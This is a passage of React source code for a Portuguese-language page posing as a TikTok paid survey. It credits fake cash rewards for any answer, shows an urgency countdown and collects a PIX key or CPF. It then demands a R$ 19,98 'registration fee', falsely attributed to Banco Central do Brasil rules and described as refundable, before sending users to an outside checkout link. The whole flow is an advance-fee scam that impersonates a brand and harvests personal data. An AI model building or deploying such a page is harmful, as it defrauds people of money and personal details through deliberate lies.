import React, { useState, useEffect } from 'react';
import { Coins, RotateCcw, ArrowRight, Banknote, HelpCircle, ArrowLeft, Trophy, Star, Gem, Target, Sparkles, Zap } from 'lucide-react';

// Hook para tocar som
const useSound = (soundFile: string) => {
  const playSound = () => {
    try {
      const audio = new Audio(soundFile);
      audio.volume = 0.5; // Volume médio para o som de dinheiro
      audio.play().catch(e => console.log('Erro ao tocar som:', e));
    } catch (error) {
      console.log('Erro ao carregar som:', error);
    }
  };
  
  return playSound;
};

// Som de dinheiro usando o arquivo externo
const playMoneySound = () => {
  try {
    const audio = new Audio('https://ttk.appconvite.site/src/media/dinheiro.mp3');
    audio.volume = 0.6; // Volume um pouco mais alto para o som real
    audio.play().catch(e => console.log('Erro ao tocar som de dinheiro:', e));
  } catch (error) {
    console.log('Erro ao carregar som de dinheiro:', error);
  }
};

// Componente de confete individual para a tela final
const ConfettiPiece = ({ delay }: { delay: number }) => {
  const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57', '#ff9ff3', '#54a0ff'];
  const color = colors[Math.floor(Math.random() * colors.length)];
  const left = Math.random() * 100;
  const animationDuration = 2 + Math.random() * 1; // 2-3 segundos
  
  return (
    <div
      className="fixed w-2 h-2 rounded-full pointer-events-none z-50"
      style={{
        backgroundColor: color,
        left: `${left}%`,
        top: '-10px',
        animation: `confetti-fall ${animationDuration}s linear ${delay}s forwards`,
      }}
    />
  );
};

// Componente de chuva de confetes para a tela final
const ConfettiRain = ({ show }: { show: boolean }) => {
  if (!show) return null;
  
  return (
    <div className="fixed inset-0 pointer-events-none z-40">
      {Array.from({ length: 50 }, (_, i) => (
        <ConfettiPiece key={i} delay={i * 0.1} />
      ))}
    </div>
  );
};

// Componente de contador regressivo
const CountdownTimer = () => {
  const [timeLeft, setTimeLeft] = useState(24 * 60 * 60); // 24 horas em segundos

  useEffect(() => {
    // Verifica se já existe um tempo salvo no localStorage
    const savedTime = localStorage.getItem('countdownTime');
    const savedTimestamp = localStorage.getItem('countdownTimestamp');
    
    if (savedTime && savedTimestamp) {
      const elapsed = Math.floor((Date.now() - parseInt(savedTimestamp)) / 1000);
      const remaining = parseInt(savedTime) - elapsed;
      setTimeLeft(Math.max(0, remaining));
    } else {
      // Primeira vez, salva o tempo inicial
      localStorage.setItem('countdownTime', (24 * 60 * 60).toString());
      localStorage.setItem('countdownTimestamp', Date.now().toString());
    }

    const timer = setInterval(() => {
      setTimeLeft(prevTime => {
        const newTime = Math.max(0, prevTime - 1);
        
        // Atualiza o localStorage
        localStorage.setItem('countdownTime', newTime.toString());
        localStorage.setItem('countdownTimestamp', Date.now().toString());
        
        // Se chegou a zero, reinicia para 24 horas
        if (newTime === 0) {
          const resetTime = 24 * 60 * 60;
          localStorage.setItem('countdownTime', resetTime.toString());
          localStorage.setItem('countdownTimestamp', Date.now().toString());
          return resetTime;
        }
        
        return newTime;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return <span className="font-mono">{formatTime(timeLeft)}</span>;
};

interface Question {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
  reward: number; // valor em centavos
}

// Componente de contador animado
const AnimatedCounter = ({ start, end, duration = 2000 }: { start: number; end: number; duration?: number }) => {
  const [current, setCurrent] = useState(start);
  
  useEffect(() => {
    const startTime = Date.now();
    const difference = end - start;
    
    const updateCounter = () => {
      const elapsed = Date.now() - startTime;
      const progress = Math.min(elapsed / duration, 1);
      
      // Função de easing para suavizar a animação
      const easeOutQuart = 1 - Math.pow(1 - progress, 4);
      const newValue = start + (difference * easeOutQuart);
      
      setCurrent(Math.round(newValue));
      
      if (progress < 1) {
        requestAnimationFrame(updateCounter);
      }
    };
    
    requestAnimationFrame(updateCounter);
  }, [start, end, duration]);
  
  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(value / 100);
  };

  return <span>{formatCurrency(current)}</span>;
};

// Componente de animação de celebração
const AnimatedCelebration = () => {
  return (
    <div className="relative w-32 h-32 mx-auto mb-4">
      {/* Troféu Central */}
      <div className="absolute inset-0 flex items-center justify-center">
        <div className="animate-bounce">
          <div className="text-6xl animate-pulse">🎉</div>
        </div>
      </div>
      
      {/* Elementos Orbitais */}
      <div className="absolute top-4 right-4 animate-spin">
        <div className="text-2xl">⭐</div>
      </div>
      <div className="absolute top-4 left-4 animate-pulse">
        <div className="text-2xl">💎</div>
      </div>
      <div className="absolute bottom-6 right-6 animate-bounce" style={{ animationDelay: '0.3s' }}>
        <div className="text-xl">🎯</div>
      </div>
      <div className="absolute bottom-6 left-6 animate-pulse" style={{ animationDelay: '0.6s' }}>
        <div className="text-xl">✨</div>
      </div>
      <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 animate-ping">
        <div className="text-lg">⚡</div>
      </div>
    </div>
  );
};

const questions: Question[] = [
  {
    id: 1,
    question: "Como você avalia sua experiência geral no TikTok?",
    options: ["😍 Excelente", "😊 Boa", "😐 Regular", "😞 Ruim"],
    correctAnswer: 0,
    reward: 6247 // R$ 62,47
  },
  {
    id: 2,
    question: "Como você descobre novos vídeos no TikTok?",
    options: ["🎯 Feed \"Para você\"", "👤 Seguindo criadores", "🔍 Através de hashtags", "📋 Feed \"Seguindo\""],
    correctAnswer: 1,
    reward: 4823 // R$ 48,23
  },
  {
    id: 3,
    question: "Como você descobre novos vídeos no TikTok?",
    options: ["🎯 Feed \"Para você\"", "👤 Seguindo criadores", "🔍 Através de hashtags", "📋 Feed \"Seguindo\"", "💡 Recomendações"],
    correctAnswer: 1,
    reward: 7156 // R$ 71,56
  },
  {
    id: 4,
    question: "O que te faz seguir um criador no TikTok?",
    options: ["🎭 Conteúdo divertido", "📚 Conteúdo educativo", "🤝 Conexão pessoal", "🔥 Participação em desafios", "📅 Frequência de postagens"],
    correctAnswer: 0,
    reward: 3914 // R$ 39,14
  },
  {
    id: 5,
    question: "Qual desses temas de conteúdo você mais gosta de assistir no TikTok?",
    options: ["😂 Comédia", "💃 Dança", "ℹ️ Tutoriais e dicas", "📹 Vlogs diários", "💄 Moda e beleza"],
    correctAnswer: 0,
    reward: 8765 // R$ 87,65
  },
  {
    id: 6,
    question: "Qual horário do dia você mais usa o TikTok?",
    options: ["🌅 Manhã", "🌞 Tarde", "🌙 Noite", "🌜 Madrugada"],
    correctAnswer: 1,
    reward: 2587 // R$ 25,87
  },
  {
    id: 7,
    question: "Qual seção do TikTok você mais acessa?",
    options: ["🎯 Para Você", "👥 Seguindo", "📺 TikTok Live", "🔍 Descobrir", "➕ Outro"],
    correctAnswer: 2,
    reward: 9432 // R$ 94,32
  },
  {
    id: 8,
    question: "Com que frequência você comenta em vídeos do TikTok?",
    options: ["💬 Sempre", "📅 Frequentemente", "⏳ Às vezes", "📊 Raramente", "🚫 Nunca"],
    correctAnswer: 1,
    reward: 1698 // R$ 16,98
  },
  {
    id: 9,
    question: "Você já criou conteúdo no TikTok?",
    options: ["🎬 Sim, frequentemente", "📱 Sim, ocasionalmente", "🤔 Tentei algumas vezes", "👀 Não, só assisto"],
    correctAnswer: 1,
    reward: 6789 // R$ 67,89
  },
  {
    id: 10,
    question: "Qual é a sua faixa etária?",
    options: ["👤 13-17 anos", "🎉 18-24 anos", "👔 25-34 anos", "👨 35 anos ou mais"],
    correctAnswer: 2,
    reward: 8576 // R$ 85,76
  }
];

function App() {
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [selectedAnswer, setSelectedAnswer] = useState<number | null>(null);
  const [totalBalance, setTotalBalance] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [isAnswered, setIsAnswered] = useState(false);
  const [lastQuizReward, setLastQuizReward] = useState(0);
  const [showWithdraw, setShowWithdraw] = useState(false);
  const [selectedAmount, setSelectedAmount] = useState<string>('');
  const [pixType, setPixType] = useState('cpf');
  const [pixKey, setPixKey] = useState('');
  const [showCongrats, setShowCongrats] = useState(false);
  const [currentReward, setCurrentReward] = useState(0);
  const [totalQuizReward, setTotalQuizReward] = useState(0);
  const [previousBalance, setPreviousBalance] = useState(0);
  const [showQuizComplete, setShowQuizComplete] = useState(false);
  const [showRegistrationFee, setShowRegistrationFee] = useState(false);
  const [showVSL, setShowVSL] = useState(false);
  const [showConfetti, setShowConfetti] = useState(false);

  const currentQuestion = questions[currentQuestionIndex];
  const progress = ((currentQuestionIndex + 1) / questions.length) * 100;

  useEffect(() => {
    const savedBalance = localStorage.getItem('quizBalance');
    if (savedBalance) {
      setTotalBalance(parseInt(savedBalance));
    }
  }, []);

  const saveBalance = (newBalance: number) => {
    setTotalBalance(newBalance);
    localStorage.setItem('quizBalance', newBalance.toString());
  };

  const handleAnswerSelect = (answerIndex: number) => {
    if (isAnswered) return;
    setSelectedAnswer(answerIndex);
  };

  const handleNext = () => {
    if (selectedAnswer === null) return;
    
    if (!isAnswered) {
      setIsAnswered(true);
      
      // Todas as respostas são consideradas corretas
      const reward = currentQuestion.reward;
      setCurrentReward(reward);
      
      // Tocar som de dinheiro
      playMoneySound();
      
      // Salva o saldo anterior para a animação
      setPreviousBalance(totalBalance);
      
      // Atualiza o saldo imediatamente somando a recompensa atual
      const newBalance = totalBalance + reward;
      saveBalance(newBalance);
      setTotalQuizReward(prev => prev + reward);
      
      setShowCongrats(true);
      
      setTimeout(() => {
        if (currentQuestionIndex < questions.length - 1) {
          setCurrentQuestionIndex(currentQuestionIndex + 1);
          setSelectedAnswer(null);
          setIsAnswered(false);
          setShowCongrats(false);
        } else {
          setLastQuizReward(totalQuizReward + reward);
          setShowCongrats(false);
          setShowQuizComplete(true);
          setShowConfetti(true);
          
          // Remove confetti após 3 segundos
          setTimeout(() => {
            setShowConfetti(false);
          }, 3000);
        }
      }, showCongrats ? 3000 : 1500);
    }
  };

  const handleReceiveReward = () => {
    setShowQuizComplete(false);
    setShowWithdraw(true);
  };

  const restartQuiz = () => {
    setCurrentQuestionIndex(0);
    setSelectedAnswer(null);
    setShowResult(false);
    setIsAnswered(false);
    setLastQuizReward(0);
    setShowCongrats(false);
    setTotalQuizReward(0);
  };

  const continueApp = () => {
    restartQuiz();
  };

  const handleWithdraw = () => {
    setShowWithdraw(true);
  };

  const handleBackFromWithdraw = () => {
    setShowWithdraw(false);
    setSelectedAmount('');
    setPixType('');
    setPixKey('');
  };

  const handleAmountSelect = (amount: string) => {
    setSelectedAmount(amount);
  };

  const handleWithdrawSubmit = () => {
    if (!selectedAmount || !pixType || !pixKey) {
      alert('Por favor, preencha todos os campos');
      return;
    }
    setShowRegistrationFee(true);
  };

  const handleBackFromRegistrationFee = () => {
    setShowRegistrationFee(false);
  };

  const handleFinalizeWithdraw = () => {
    setShowRegistrationFee(false);
    setShowVSL(true);
  };

  const handleBackFromVSL = () => {
    setShowVSL(false);
    setShowRegistrationFee(true);
  };

  const handleUnlockWithdraw = () => {
    alert('Solicitação de saque enviada! Processamento em até 24h.');
    setShowVSL(false);
    setShowRegistrationFee(false);
    handleBackFromWithdraw();
  };

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(value / 100);
  };

  // VSL Page
  if (showVSL) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center sm:p-4">
        <div className="w-full max-w-md bg-white sm:rounded-lg sm:shadow-lg overflow-hidden min-h-screen sm:min-h-0">
          {/* Header igual ao app */}
          <div className="flex items-center justify-between p-4 border-b">
            <div className="flex items-center">
              <button onClick={handleBackFromVSL} className="p-2 hover:bg-gray-100 rounded-full mr-2">
                <ArrowLeft size={20} />
              </button>
              <img 
                src="/unnamed copy copy.png" 
                alt="TikTok" 
                className="h-8 mr-2"
              />
            </div>
            <div className="flex items-center gap-3">
              <div className="bg-gray-100 px-4 py-2 rounded-lg font-semibold flex items-center">
                <span className="text-sm text-gray-600">SALDO</span>
              </div>
              <div className="bg-pink-100 px-4 py-2 rounded-lg font-bold text-pink-600">
                {formatCurrency(totalBalance)}
              </div>
            </div>
          </div>

          {/* Progress Bar */}
          <div className="w-full h-2 bg-gray-200">
            <div 
              className="h-full transition-all duration-500"
              style={{ backgroundColor: '#FF4D70' }}
              style={{ width: '100%' }}
            />
          </div>

          <div className="p-5">
            {/* Título */}
            <div className="text-center mb-5">
              <h1 className="text-2xl font-bold text-pink-500 mb-2">
                DESBLOQUEIO DE SALDO
              </h1>
              <p className="text-gray-600">
                Veja como liberar seu saque assistindo ao vídeo.
              </p>
            </div>

            {/* Container do vídeo */}
            <div className="bg-black rounded-lg overflow-hidden mb-5">
              <video 
                className="w-full aspect-[9/16] object-cover"
                controls
                autoPlay
                muted
                preload="metadata"
              >
                <source src="https://ttk.appconvite.site/src/media/vsl.mp4" type="video/mp4" />
                Seu navegador não suporta o elemento de vídeo.
              </video>
            </div>

            {/* Botão de desbloqueio */}
            <button 
              onClick={() => window.location.href = 'https://pay.checkout-pagttkk.shop/bz5KZbVXw2KZ7dL'}
              className="w-full text-white py-4 rounded-full font-bold text-lg transition-colors shadow-lg"
              style={{ backgroundColor: '#FF4D70' }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#ff6b85'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FF4D70'}
            >
              DESBLOQUEAR AGORA
            </button>

            {/* Informação adicional */}
            <div className="text-center mt-4">
              <p className="text-sm text-gray-500">
                Após assistir o vídeo, clique no botão acima para liberar seu saque
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Registration Fee Page
  if (showRegistrationFee) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
          <div className="flex items-center justify-between p-5 border-b border-gray-100">
            <button onClick={handleBackFromRegistrationFee} className="p-2 hover:bg-gray-100 rounded-full">
              <ArrowLeft size={20} />
            </button>
            <h1 className="text-lg font-semibold text-gray-800">Taxa de Cadastro</h1>
            <div className="w-10"></div>
          </div>

          <div className="p-6">
            {/* TikTok Logo */}
            <div className="flex justify-center mb-6">
              <img 
                src="/unnamed copy copy.png" 
                alt="TikTok" 
                className="h-12"
              />
            </div>

            {/* Title */}
            <div className="flex items-center justify-center mb-4">
              <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-3">
                <svg className="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                </svg>
              </div>
              <h2 className="text-2xl font-bold text-gray-800">Taxa de Cadastro</h2>
            </div>

            {/* Description */}
            <div className="text-center mb-8">
              <p className="text-gray-600 leading-relaxed mb-4">
                Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma 
                confirmação de identidade de <span className="font-semibold text-pink-600">R$ 19,98</span> para garantir a autenticidade 
                dos participantes.
              </p>
              <p className="text-gray-500 text-sm">
                O dinheiro será totalmente reembolsado entre 1 a 5 minutos junto ao 
                saldo acumulado.
              </p>
            </div>

            {/* Features */}
            <div className="space-y-4 mb-8">
              {/* Taxa obrigatória */}
              <div className="flex items-start space-x-4 p-4 bg-purple-50 rounded-lg">
                <div className="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-5 h-5 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800 mb-1">Taxa obrigatória</h3>
                  <p className="text-sm text-gray-600">Obrigatório para realizar o saque dos seus ganhos.</p>
                </div>
              </div>

              {/* Valor reembolsável */}
              <div className="flex items-start space-x-4 p-4 bg-blue-50 rounded-lg">
                <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                  </svg>
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800 mb-1">Valor reembolsável</h3>
                  <p className="text-sm text-gray-600">Você recebe os R$ 19,98 de volta após finalizar.</p>
                </div>
              </div>

              {/* Garantia de segurança */}
              <div className="flex items-start space-x-4 p-4 bg-orange-50 rounded-lg">
                <div className="w-10 h-10 bg-orange-100 rounded-full flex items-center justify-center flex-shrink-0">
                  <svg className="w-5 h-5 text-orange-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800 mb-1">Garantia de segurança</h3>
                  <p className="text-sm text-gray-600">Seu pagamento é seguro e protegido por Banco Central do Brasil.</p>
                </div>
              </div>
            </div>

            {/* Action Button */}
            <button 
              onClick={handleFinalizeWithdraw}
              className="w-full text-white py-4 rounded-full font-semibold text-lg transition-colors shadow-lg"
              style={{ backgroundColor: '#FF4D70' }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#ff6b85'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FF4D70'}
            >
              REALIZAR SAQUE
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Withdraw Page
  if (showWithdraw) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
          <div className="flex items-center justify-between p-5 border-b border-gray-100">
            <button onClick={handleBackFromWithdraw} className="p-2 hover:bg-gray-100 rounded-full">
              <ArrowLeft size={20} />
            </button>
            <h1 className="text-lg font-semibold text-gray-800">Sacar</h1>
            <button className="p-2 hover:bg-gray-100 rounded-full">
              <HelpCircle size={20} />
            </button>
          </div>

          <div className="p-5">
            {/* Saldo Disponível */}
            <div className="bg-gray-800 text-white p-5 rounded-2xl mb-3 flex items-center justify-between">
              <div>
                <div className="text-sm text-gray-300 mb-1">Saldo Disponível</div>
                <div className="text-3xl font-bold">{formatCurrency(totalBalance)}</div>
              </div>
              <div className="w-12 h-12 flex items-center justify-center">
                <img 
                  src="/Group-3-1.png copy.png" 
                  alt="Moeda P" 
                  className="w-12 h-12 object-contain"
                />
              </div>
            </div>

            {/* Últimas Recompensas */}
            <div className="bg-gray-700 text-white p-4 rounded-xl mb-6 flex items-center justify-between">
              <span className="text-sm">Tempo de novas recompensas:</span>
              <CountdownTimer />
            </div>

            <div className="mb-6">
              {/* PIX */}
              <div className="flex items-center gap-3 mb-6 bg-gray-50 p-4 rounded-xl">
                <div className="w-1 h-16 bg-teal-400 rounded-full self-center"></div>
                <div>
                  <div className="font-semibold text-gray-800">PIX</div>
                  <div className="text-sm text-gray-500">Transferência instantânea</div>
                  <div className="text-xs text-green-600 font-medium flex items-center mt-1">
                    ✅ Assegurado pelo Banco Central
                  </div>
                </div>
              </div>

              {/* Valor do saque */}
              <h4 className="font-semibold text-gray-700 mb-4">Valor do saque</h4>
              <div className="grid grid-cols-2 gap-3 mb-3">
                {['R$ 10,00', 'R$ 50,00', 'R$ 100,00', formatCurrency(totalBalance)].map((amount) => (
                  <button
                    key={amount}
                    onClick={() => handleAmountSelect(amount)}
                    className={`px-4 py-3 border-2 rounded-lg font-semibold transition-all text-sm ${
                      selectedAmount === amount
                        ? 'shadow-sm'
                        : 'border-gray-200 hover:border-gray-300 text-gray-700'
                    }`}
                    style={selectedAmount === amount ? {
                      borderColor: '#FF4D70',
                      backgroundColor: 'rgba(255, 77, 112, 0.1)',
                      color: '#cc1f47'
                    } : {}}
                  >
                    {amount}
                  </button>
                ))}
              </div>
              
              <p className="text-sm text-gray-400 mb-6">O valor mínimo para saque é de R$10,00.</p>

              {/* Tipo de chave PIX */}
              <h4 className="font-semibold text-gray-700 mb-3">Tipo de chave PIX</h4>
              <div className="space-y-4 mb-6">
                <select
                  value={pixType}
                  onChange={(e) => setPixType(e.target.value)}
                  className="w-full p-4 border border-gray-200 rounded-xl bg-white focus:border-gray-400 outline-none text-gray-700"
                >
                  <option value="cpf">CPF</option>
                  <option value="email">E-mail</option>
                  <option value="telefone">Telefone</option>
                  <option value="aleatoria">Chave aleatória</option>
                </select>

                {/* Chave PIX */}
                <div>
                  <h4 className="font-semibold text-gray-700 mb-3">Chave PIX</h4>
                </div>
                <input
                  type="text"
                  value={pixKey}
                  onChange={(e) => setPixKey(e.target.value)}
                  placeholder="Digite seu CPF"
                  className="w-full p-4 border border-gray-200 rounded-xl bg-white focus:border-gray-400 outline-none text-gray-700"
                />
              </div>

              {/* Botão Realizar Saque */}
              <button 
                onClick={handleWithdrawSubmit} 
                className="w-full text-white p-4 rounded-full font-semibold text-lg transition-colors mb-4"
                style={{ backgroundColor: '#FF4D70' }}
                onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#ff6b85'}
                onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FF4D70'}
              >
                Realizar Saque
              </button>

              <div className="text-sm text-gray-500 text-center">
                O saque será processado em até 24 horas.
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Results Page
  if (showResult) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
          <div className="flex items-center justify-between p-4 border-b">
            <div className="flex items-center">
              <img 
                src="/unnamed copy copy.png" 
                alt="TikTok" 
                className="h-12 mr-2"
              />
            </div>
            <div className="flex items-center gap-3">
              <div className="bg-gray-100 px-2 py-1 rounded-lg font-semibold flex items-center text-sm">
                <Coins size={16} className="mr-2" />
                {formatCurrency(totalBalance)}
              </div>
              <button 
                onClick={handleWithdraw}
                className="bg-pink-500 text-white px-3 sm:px-4 py-2 sm:py-2 rounded-lg hover:bg-pink-600 transition-colors"
                title="Sacar"
              >
                <Banknote size={16} />
              </button>
            </div>
          </div>

          <div className="p-8 text-center">
            <div className="text-6xl mb-4">🎉</div>
            <h2 className="text-2xl font-bold text-green-600 mb-2">Parabéns!</h2>
            
            <div className="text-gray-600 mb-2">Você ganhou</div>
            <div className="text-5xl font-bold text-green-600 mb-4">{formatCurrency(lastQuizReward)}</div>
            <div className="text-gray-500 mb-8">
              Adicionado ao seu saldo
            </div>

            <button 
              onClick={continueApp}
              className="w-full bg-black text-white py-4 rounded-full font-semibold mb-3 hover:bg-gray-800 transition-colors"
            >
              Continuar
            </button>
            
            <button 
              onClick={restartQuiz}
              className="w-full border border-gray-300 text-gray-600 py-4 rounded-full font-semibold flex items-center justify-center hover:bg-gray-50 transition-colors"
            >
              <RotateCcw size={16} className="mr-2" />
              Jogar novamente
            </button>
          </div>

          <div className="border-t p-4 text-center text-sm text-gray-500">
            <small>© 2025 — Todos os direitos reservados</small>
            <div className="mt-2">
              <a href="#" className="hover:underline" style={{ color: '#FF4D70' }}>Termos</a> | <a href="#" className="hover:underline" style={{ color: '#FF4D70' }}>Privacidade</a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Main Quiz Page
  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center sm:p-4">
      <div className="w-full max-w-md bg-white sm:rounded-lg sm:shadow-lg overflow-hidden min-h-screen sm:min-h-0">
        <div className="flex items-center justify-between p-4 border-b">
          <div className="flex items-center">
            <img 
              src="/unnamed copy copy.png" 
              alt="TikTok" 
              className="h-12 sm:h-10 mr-3"
            />
          </div>
          <div className="flex items-center gap-2">
            <div className="bg-gray-100 px-3 py-2 rounded-lg font-semibold flex items-center text-sm">
              <Coins size={14} className="mr-2 sm:mr-2" />
              {formatCurrency(totalBalance)}
            </div>
            <button 
              onClick={handleWithdraw}
              className="text-white px-3 py-2 rounded-lg transition-colors"
              style={{ backgroundColor: '#FF4D70' }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#ff6b85'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FF4D70'}
              style={{ backgroundColor: '#FF4D70' }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#ff6b85'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FF4D70'}
              style={{ backgroundColor: '#FF4D70' }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#ff6b85'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FF4D70'}
              title="Sacar"
            >
              <Banknote size={16} />
            </button>
          </div>
        </div>

        <div className="w-full h-2 bg-gray-200">
          <div 
            className="h-full transition-all duration-500"
            style={{ 
              backgroundColor: '#FF4D70',
              width: `${progress}%`
            }}
          />
        </div>

        <div className="p-4 sm:p-6">
          <div className="mb-8 sm:mb-6">
            <p className="text-gray-400 text-base sm:text-sm text-center mb-6 sm:mb-4">
              Pergunta {currentQuestionIndex + 1} de {questions.length} • +{formatCurrency(currentQuestion.reward)}
            </p>
            
            <p className="text-3xl sm:text-2xl font-bold text-center mb-6 sm:mb-4">
              {currentQuestion.question}
            </p>
            
            <p className="text-gray-500 text-center text-base sm:text-sm mb-6 sm:mb-4">
              Selecione uma opção para continuar
            </p>
            
            <div className="space-y-5 sm:space-y-4">
              {currentQuestion.options.map((option, index) => {
                let optionClass = "flex items-center justify-between p-5 sm:p-4 border-2 rounded-xl sm:rounded-lg cursor-pointer transition-all";
                
                if (isAnswered) {
                  // Todas as respostas ficam verdes quando respondidas
                  if (index === selectedAnswer) {
                    optionClass += " border-green-500 bg-green-50 text-green-700";
                  } else {
                    optionClass += " border-gray-200 bg-gray-50 text-gray-500";
                  }
                } else if (selectedAnswer === index) {
                  optionClass += " text-pink-600";
                  optionClass += " border-pink-500 bg-pink-50";
                } else {
                  optionClass += " border-gray-200 hover:border-gray-300 hover:bg-gray-50";
                }

                return (
                  <div
                    key={index}
                    onClick={() => handleAnswerSelect(index)}
                    className={optionClass}
                    style={{
                      cursor: isAnswered ? 'default' : 'pointer'
                    }}
                  >
                    <div className="flex items-center">
                      <span className="text-xl sm:text-lg font-semibold mr-4 sm:mr-3 min-w-[28px] sm:min-w-[24px]">
                        {String.fromCharCode(65 + index)}
                      </span>
                      <span className="text-lg sm:text-base leading-relaxed">{option}</span>
                    </div>
                    <div className="w-6 sm:w-5 h-6 sm:h-5 border-2 border-gray-300 rounded flex items-center justify-center flex-shrink-0">
                      {(isAnswered && index === selectedAnswer) && <span className="text-green-600">✓</span>}
                      {(!isAnswered && selectedAnswer === index) && <span className="text-pink-600">✓</span>}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          <button
            onClick={handleNext}
            disabled={selectedAnswer === null}
            className="w-full text-white py-5 sm:py-4 rounded-xl sm:rounded-lg font-semibold text-lg sm:text-base disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors flex items-center justify-center"
            style={{ 
              backgroundColor: selectedAnswer === null ? '#d1d5db' : '#FF4D70'
            }}
            onMouseEnter={(e) => {
              if (selectedAnswer !== null) {
                e.currentTarget.style.backgroundColor = '#ff6b85';
              }
            }}
            onMouseLeave={(e) => {
              if (selectedAnswer !== null) {
                e.currentTarget.style.backgroundColor = '#FF4D70';
              }
            }}
          >
            {isAnswered ? (
              currentQuestionIndex === questions.length - 1 ? 'Finalizando...' : 'Próxima pergunta...'
            ) : (
              <>
                Próximo
                <ArrowRight size={18} className="ml-2" />
              </>
            )}
          </button>
          
          {/* Texto de bônus adicional */}
          <div className="text-center mt-2 text-green-500 font-medium text-sm">
            Concorra a um bônus adicional
          </div>
        </div>

        {/* Congratulations Box */}
        {showCongrats && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 fade-in">
            <div className="bg-white rounded-2xl p-10 sm:p-8 mx-4 max-w-sm w-full text-center zoom-in">
              <div className="mb-4">
                <AnimatedCelebration />
              </div>
              <h3 className="text-3xl sm:text-2xl font-bold text-green-600 mb-3 sm:mb-2">Parabéns!</h3>
              <div className="text-5xl sm:text-4xl font-bold text-green-600 mb-3 sm:mb-2 animate-pulse">+{formatCurrency(currentReward)}</div>
              <p className="text-base sm:text-sm text-gray-500 mb-5 sm:mb-4">
                adicionados ao seu saldo
              </p>
              <div className="text-lg sm:text-base font-semibold text-gray-700 animate-bounce">
                Saldo atual: <AnimatedCounter start={previousBalance} end={totalBalance} duration={1500} />
              </div>
            </div>
          </div>
        )}

        {/* Quiz Completion Box */}
        {showQuizComplete && (
          <>
            <ConfettiRain show={showConfetti} />
            <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 fade-in">
              <div className="bg-gradient-to-b from-purple-500 to-purple-600 rounded-2xl p-10 sm:p-8 mx-4 max-w-sm w-full text-center zoom-in shadow-lg">
                <div className="text-6xl sm:text-4xl mb-5 sm:mb-4 filter drop-shadow-lg">🎉</div>
                
